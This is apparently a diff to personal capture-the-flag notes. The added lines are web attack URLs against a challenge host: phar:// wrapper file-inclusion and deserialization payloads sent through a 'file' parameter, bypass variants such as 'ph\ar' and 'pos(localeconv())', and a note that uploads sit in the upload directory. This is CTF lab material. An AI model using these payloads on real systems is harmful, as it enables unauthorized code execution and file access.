@@ -290,6 +290,19 @@ https://www.chainnews.com/articles/284498604176.htm
 
 https://www.anquanke.com/post/id/189142#h3-12
 
+test.jpg
+http://xmctf.top:8841/file.php?file=
+http://xmctf.top:8841/file.php?file=phar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
+http://xmctf.top:8841/file.php?file=phar://upload/0412c29576c708cf0155e8de242169b1.jpg
+http://xmctf.top:8841/file.php?file=phar://pos(localeconv())/upload/0412c29576c708cf0155e8de242169b1.jpg
+http://xmctf.top:8841/file.php?file=phar://upload/098f6bcd4621d373cade4e832627b4f6.jpg
+http://xmctf.top:8841/file.php?file=ph\ar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
+
+文件在upload目录下。
+?file=phar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
+?file=phar:///upload/0412c29576c708cf0155e8de242169b1.jpg
+
+
 ## xweb5
 method=logout
 /phpinfo.php
